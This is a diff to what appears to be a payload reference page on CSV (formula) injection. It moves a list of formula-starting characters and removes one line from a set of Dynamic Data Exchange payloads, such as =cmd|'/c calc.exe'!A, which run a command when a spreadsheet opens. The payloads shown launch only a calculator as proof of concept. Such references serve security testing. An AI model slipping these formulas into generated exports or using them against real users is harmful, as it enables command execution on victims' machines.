@@ -11,6 +11,16 @@
 
 ## Methodology
 
+CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted input is included in a CSV file. Any formula can be started with: 
+
+```powershell
+=
++
+–
+@
+```
+
+
 Basic exploits with **Dynamic Data Exchange**.
 
 * Spawn a calc
@@ -30,7 +40,6 @@ Basic exploits with **Dynamic Data Exchange**.
     ```powershell
     =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
     =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
-    +thespanishinquisition(cmd|'/c calc.exe'!A
     =         cmd|'/c calc.exe'!A
     ```
 
@@ -50,16 +59,6 @@ Technical details of the above payloads:
 - `cmd` is the name the server can respond to whenever a client is trying to access the server
 - `/C` calc is the file name which in our case is the calc(i.e the calc.exe)
 - `!A0` is the item name that specifies unit of data that a server can respond when the client is requesting the data
-
-
-Any formula can be started with
-
-```powershell
-=
-+
-–
-@
-```
 
 
 ## References
